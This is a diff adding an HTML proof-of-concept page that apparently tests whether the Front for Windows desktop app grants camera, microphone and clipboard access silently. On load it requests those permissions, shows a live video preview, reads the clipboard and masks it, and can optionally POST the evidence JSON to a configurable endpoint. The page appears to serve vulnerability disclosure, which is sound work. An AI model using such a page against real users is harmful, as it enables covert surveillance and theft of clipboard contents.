@@ -1,0 +1,189 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>F1 — Front desktop permission-grant PoC</title>
+<style>
+  :root { color-scheme: light dark; }
+  body { font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif; margin: 0; padding: 24px; line-height: 1.45; }
+  h1 { font-size: 20px; margin: 0 0 4px; }
+  .sub { opacity: .7; font-size: 13px; margin-bottom: 18px; }
+  .badge { display: inline-block; padding: 10px 16px; border-radius: 10px; font-weight: 700; font-size: 16px; margin-bottom: 16px; }
+  .pending { background: #eee; color: #333; }
+  .granted { background: #b3261e; color: #fff; }
+  .denied  { background: #1b5e20; color: #fff; }
+  .prompt  { background: #8a6d00; color: #fff; }
+  table { border-collapse: collapse; width: 100%; max-width: 900px; font-size: 14px; margin-bottom: 16px; }
+  th, td { text-align: left; padding: 6px 10px; border-bottom: 1px solid #ddd; vertical-align: top; }
+  th { width: 210px; font-weight: 600; }
+  code, pre { font-family: ui-monospace, Consolas, monospace; font-size: 12.5px; }
+  pre { background: #f6f6f6; padding: 12px; border-radius: 8px; overflow: auto; max-width: 900px; }
+  video { width: 240px; border-radius: 8px; background: #000; margin-right: 8px; }
+  .row { display: flex; gap: 16px; align-items: flex-start; flex-wrap: wrap; }
+  button { font: inherit; padding: 8px 14px; border-radius: 8px; border: 1px solid #999; background: #fff; cursor: pointer; }
+  .note { max-width: 900px; font-size: 13px; opacity: .85; }
+  .k { font-weight: 600; }
+</style>
+</head>
+<body>
+<h1>Front desktop — silent permission grant PoC (F1)</h1>
+<div class="sub">Open this page inside the Front for Windows app (it should be a new window, not your browser). It requests camera + microphone + clipboard on load.</div>
+
+<div id="badge" class="badge pending">waiting…</div>
+
+<div class="row">
+  <div>
+    <video id="preview" autoplay muted playsinline></video>
+  </div>
+  <div style="flex:1;min-width:320px">
+    <table id="results">
+      <tr><th>origin</th><td id="r-origin">…</td></tr>
+      <tr><th>secure context</th><td id="r-secure">…</td></tr>
+      <tr><th>user agent</th><td id="r-ua">…</td></tr>
+      <tr><th>Front desktop?</th><td id="r-front">…</td></tr>
+      <tr><th>window.windowBridge</th><td id="r-bridge">…</td></tr>
+      <tr><th>permission: camera</th><td id="r-pcam">…</td></tr>
+      <tr><th>permission: microphone</th><td id="r-pmic">…</td></tr>
+      <tr><th>getUserMedia</th><td id="r-gum">…</td></tr>
+      <tr><th>time to grant</th><td id="r-ms">…</td></tr>
+      <tr><th>tracks</th><td id="r-tracks">…</td></tr>
+      <tr><th>clipboard.readText()</th><td id="r-clip">…</td></tr>
+    </table>
+    <button id="rerun">Run again</button>
+    <button id="copy">Copy evidence JSON</button>
+    <button id="download">Download evidence JSON</button>
+  </div>
+</div>
+
+<h3 style="margin-top:24px">Evidence JSON</h3>
+<pre id="json">{}</pre>
+
+<p class="note">
+  <span class="k">How to read this:</span> if the badge says <b>GRANTED</b> and no permission prompt
+  appeared, the Front desktop app answered "allow" on your behalf. Run the same URL in Chrome/Edge —
+  the request stays <i>pending</i> until you answer the normal prompt. If you saw a prompt in Front
+  too, this build does not show the issue for this origin.
+</p>
+
+<script>
+(() => {
+  const OPTIONAL_LOG_ENDPOINT = ''; // e.g. '/f1-log' — leave empty for a purely static page
+  const evidence = {
+    timestamp: new Date().toISOString(),
+    origin: location.origin,
+    href: location.href,
+    isSecureContext: window.isSecureContext,
+    userAgent: navigator.userAgent,
+    frontDesktop: /Front\/\d/.test(navigator.userAgent),
+    windowBridge: typeof window.windowBridge,
+    topLevel: window.self === window.top,
+    permissions: {},
+    getUserMedia: null,
+    clipboard: null,
+  };
+  const el = (id) => document.getElementById(id);
+  const set = (id, v) => { el(id).textContent = v; };
+  const badge = el('badge');
+  const paint = (text, cls) => { badge.textContent = text; badge.className = 'badge ' + cls; };
+
+  const t0 = performance.now();
+  set('r-origin', evidence.origin);
+  set('r-secure', String(evidence.isSecureContext));
+  set('r-ua', evidence.userAgent);
+  set('r-front', evidence.frontDesktop ? 'yes' : 'no');
+  set('r-bridge', evidence.windowBridge);
+
+  async function queryPerm(name) {
+    try { return (await navigator.permissions.query({name})).state; }
+    catch (e) { return 'query-error: ' + e.name; }
+  }
+
+  async function run() {
+    paint('requesting camera + microphone…', 'pending');
+    evidence.timestamp = new Date().toISOString();
+    evidence.permissions.camera = await queryPerm('camera');
+    evidence.permissions.microphone = await queryPerm('microphone');
+    set('r-pcam', evidence.permissions.camera);
+    set('r-pmic', evidence.permissions.microphone);
+    set('r-clip', '…');
+    set('r-gum', '…');
+    set('r-tracks', '…');
+    set('r-ms', '…');
+
+    const start = performance.now();
+    let settled = false;
+    const promptTimer = setTimeout(() => {
+      if (!settled) {
+        paint('waiting for permission prompt — this is normal browser behaviour', 'prompt');
+      }
+    }, 1500);
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({audio: true, video: true});
+      settled = true;
+      clearTimeout(promptTimer);
+      const ms = Math.round(performance.now() - start);
+      const tracks = stream.getTracks().map((t) => ({
+        kind: t.kind,
+        label: t.label,
+        readyState: t.readyState,
+        settings: t.getSettings ? t.getSettings() : {},
+      }));
+      evidence.getUserMedia = {result: 'GRANTED', ms, tracks};
+      el('preview').srcObject = stream;
+      set('r-gum', 'GRANTED (no prompt)');
+      set('r-ms', ms + ' ms');
+      set('r-tracks', tracks.map((t) => `${t.kind} "${t.label}" [${t.readyState}]`).join(' | '));
+      paint('GRANTED — camera and microphone are live, no prompt shown', 'granted');
+    } catch (e) {
+      settled = true;
+      clearTimeout(promptTimer);
+      const ms = Math.round(performance.now() - start);
+      evidence.getUserMedia = {result: 'DENIED_OR_ERROR', ms, name: e.name, message: e.message};
+      set('r-gum', 'DENIED / ' + e.name);
+      set('r-ms', ms + ' ms');
+      paint(e.name === 'NotAllowedError' ? 'DENIED — normal browser behaviour (prompt or block)'
+                                         : 'ERROR — ' + e.name, 'denied');
+    }
+
+    try {
+      const txt = await navigator.clipboard.readText();
+      evidence.clipboard = {result: 'GRANTED', length: txt.length, masked: txt.slice(0, 2) + '…'};
+      set('r-clip', 'GRANTED — read ' + txt.length + ' chars (masked: "' + txt.slice(0, 2) + '…")');
+    } catch (e) {
+      evidence.clipboard = {result: 'DENIED_OR_ERROR', name: e.name, message: e.message};
+      set('r-clip', 'DENIED / ' + e.name + (e.message ? ' — ' + e.message : ''));
+    }
+
+    const json = JSON.stringify(evidence, null, 2);
+    el('json').textContent = json;
+    if (OPTIONAL_LOG_ENDPOINT) {
+      try {
+        fetch(OPTIONAL_LOG_ENDPOINT, {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: json,
+        }).catch(() => {});
+      } catch (e) {}
+    }
+  }
+
+  el('rerun').addEventListener('click', run);
+  el('copy').addEventListener('click', async () => {
+    try { await navigator.clipboard.writeText(JSON.stringify(evidence, null, 2)); el('copy').textContent = 'Copied'; }
+    catch (e) { el('copy').textContent = 'Copy failed'; }
+  });
+  el('download').addEventListener('click', () => {
+    const blob = new Blob([JSON.stringify(evidence, null, 2)], {type: 'application/json'});
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = 'front-f1-evidence-' + Date.now() + '.json';
+    a.click();
+    setTimeout(() => URL.revokeObjectURL(a.href), 2000);
+  });
+
+  run();
+})();
+</script>
+</body>
+</html>
